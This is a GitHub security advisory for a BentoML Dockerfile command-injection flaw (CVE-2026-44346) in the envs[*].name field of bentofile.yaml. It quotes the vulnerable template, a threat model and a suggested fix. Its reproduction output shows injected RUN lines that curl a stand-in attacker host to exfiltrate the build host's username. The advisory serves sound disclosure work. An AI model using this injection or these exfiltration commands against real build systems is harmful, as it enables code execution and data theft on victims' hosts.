# [H] Dockerfile command injection via envs[*].name in bentofile.yaml (sibling fix-bypass of CVE-2026-33744 and CVE-2026-35043)

## Summary
Severity: High
Advisory: GHSA-w2pm-x38x-jp44
CVE: CVE-2026-44346
CWE: CWE-78, CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-w2pm-x38x-jp44
Type: github-advisory

## Affected
- PyPI: `bentoml` — affected >=0 <1.4.39

## Details
# BentoML `envs[*].name` Dockerfile command injection — sibling of CVE-2026-33744 / CVE-2026-35043

A malicious `bentofile.yaml` containing a newline-injected value in `envs[*].name` produces unquoted `RUN` directives in the BentoML-generated Dockerfile. When the victim runs `bentoml containerize` on the imported bento, those `RUN` directives execute on the host during `docker build`. Verified end-to-end on `bentoml==1.4.38`.

## Vulnerable code

`src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2:71-73`:

```jinja
{% for env in __bento_envs__ %}
{% set stage = env.stage | default("all") -%}
{% if stage != "runtime" -%}
ARG {{ env.name }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}
ENV {{ env.name }}=${{ env.name }}
{% endif -%}
{% endfor %}
```

`env.value` is bash-quoted via the `bash_quote` filter, but **`env.name` is interpolated raw** with no escaping or newline filtering. The template is rendered by `_bentoml_impl/docker.generate_dockerfile` (the v2 SDK Docker generation path used by `bentoml containerize` for modern services).

## Sibling relationship to existing CVEs

The earlier patches addressed the same Dockerfile-command-injection class for a different bentofile field:

- **CVE-2026-33744 / GHSA-jfjg-vc52-wqvf** (2026-03-25): added `bash_quote` to `system_packages` interpolation in Dockerfile templates and `images.py`.
- **CVE-2026-35043 / GHSA-fgv4-6jr3-jgfw** (2026-04-02): added `shlex.quote` to `system_packages` in the cloud deployment path (`_internal/cloud/deployment.py:1648`).

Both patches limit themselves to `system_packages`. The `envs[*].name` field is the same root-cause class (`bentofile.yaml` value flowing unquoted into a Dockerfile interpretation context) but was never included in the fix scope.

## Reproduction

```bash
pip install bentoml==1.4.38
python verify_render.py
```

Expected:

```
[*] rendered Dockerfile size: 1789 bytes
[*] injected RUN lines: 3
    RUN curl -fsSL http://attacker.example.com/$(whoami)=1
    RUN curl -fsSL http://attacker.example.com/$(whoami)=$FOO
    RUN curl -fsSL http://attacker.example.com/$(whoami)
```

Each injected `RUN` line is a Dockerfile command that runs during `docker build`. With `$(whoami)` shell-substituted by Docker's RUN executor, the example payload exfiltrates the build host's username.

## Threat model

1. Attacker authors a malicious bento with a crafted `bentofile.yaml`.
2. Attacker exports the bento (`.bento` or `.tar.gz`) and distributes (S3, HTTP, BentoCloud share, etc.).
3. Victim imports with `bentoml import bento.tar`; no validation of `envs` content.
4. Victim runs `bentoml containerize` to build the container image.
5. BentoML renders the Dockerfile with the attacker's `envs` values, producing injected `RUN` lines.
6. `docker build` (or BuildKit) executes the injected `RUN` commands on the build host, achieving RCE in the victim's build environment.

The flow mirrors CVE-2026-33744 exactly, with `envs` substituted for `system_packages`.

## Suggested fix

In `base_v2.j2` lines 71-73, apply the `bash_quote` filter to `env.name` (and to the `=$VAR` reference in the `ENV` line, since the variable name itself is reused there):

```jinja
ARG {{ env.name | bash_quote }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}
ENV {{ env.name | bash_quote }}=${{ env.name | bash_quote }}
```

Better, since `env.name` is semantically a Dockerfile identifier, validate at the schema level: in `bentoml/_internal/bento/build_config.py:BentoEnvSchema`, add an `attr.validators.matches_re(r"^[A-Za-z_][A-Za-z0-9_]*$")` to the `name` field so newline / shell-metacharacter values are rejected at config load.

## Affected versions

- bentoml 1.4.38 (verified end-to-end)
- Likely all 1.x versions where `_bentoml_impl/docker.py` exists; the v2 SDK code path was added before the CVE-2026-33744 / CVE-2026-35043 patches and was not retroactively swept for siblings.

## Disclosure

Requesting CVE assignment and GHSA publication. Available for additional repro under different distros / frontends, or for a PR with the suggested fix, on request.


## PoC artifacts

Gated HF repo (request access): https://huggingface.co/mrw0r57/bentoml-envs-cmdinjection-poc

## References
- https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2
- https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44
- https://nvd.nist.gov/vuln/detail/CVE-2026-44346
- https://github.com/bentoml/BentoML
- https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-190.yaml
